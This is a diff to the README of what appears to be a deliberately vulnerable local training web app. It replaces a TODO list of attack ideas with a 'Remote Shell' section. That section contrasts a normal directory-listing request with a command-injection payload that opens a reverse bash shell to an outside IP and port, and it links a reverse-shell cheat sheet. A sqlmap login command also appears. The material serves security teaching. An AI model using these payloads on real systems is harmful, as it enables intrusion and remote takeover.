@@ -71,10 +71,17 @@ sqlmap --flush-session -u http://localhost:3000/api/login --data "email=<YOUR-EM
 * Become an admin?
     * /api/admin/cleanup
 
-## TODO / Ideas
 
-* XSS CrossSiteScripting
-* CSRF CrossSiteRequestForgery
-* RemoteCodeExecution / RemoteShell
-* TimingAttacks
-* What else from OWASP Top 10?
+### Remote Shell
+
+* Good Request:
+  ```
+  # directory=/home/
+  curl http://localhost:3000/list-directory?directory=%2Fhome%2F
+  ```
+* Bad Request:
+  ```
+  # directory=/ ; bash -i >& /dev/tcp/178.63.25.243/7171 0>&1
+  curl http://localhost:3000/list-directory?directory=%2F%20%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F178.63.25.243%2F7171%200%3E%261
+  ```
+* See https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
